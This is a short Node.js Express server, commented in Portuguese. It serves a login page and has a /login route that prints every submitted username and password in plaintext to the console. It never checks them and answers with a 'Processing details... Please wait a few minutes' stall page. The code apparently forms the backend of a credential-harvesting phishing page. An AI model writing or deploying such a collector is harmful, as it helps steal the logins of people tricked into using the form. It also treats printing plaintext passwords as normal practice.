const express = require('express');
const path = require('path');
const app = express();

// Middlewares para capturar os dados do formulário
app.use(express.static(__dirname)); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Rota de recebimento dos dados
app.post('/login', (req, res) => {
    // Imprime todo o corpo da requisição para teste
    console.log('\n=================================');
    console.log('REQUISIÇÃO RECEBIDA:');
    console.log(req.body);
    console.log('=================================');

    const usuario = req.body.usuario;
    const senha = req.body.senha;

    console.log(`Login: ${usuario}`);
    console.log(`Senha: ${senha}`);
    console.log('=================================\n');

    res.send('<h2 style="font-family: sans-serif; text-align: center; margin-top: 50px;">Processing details... Please wait a few minutes.</h2>');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor ativo na porta ${PORT}`);
});
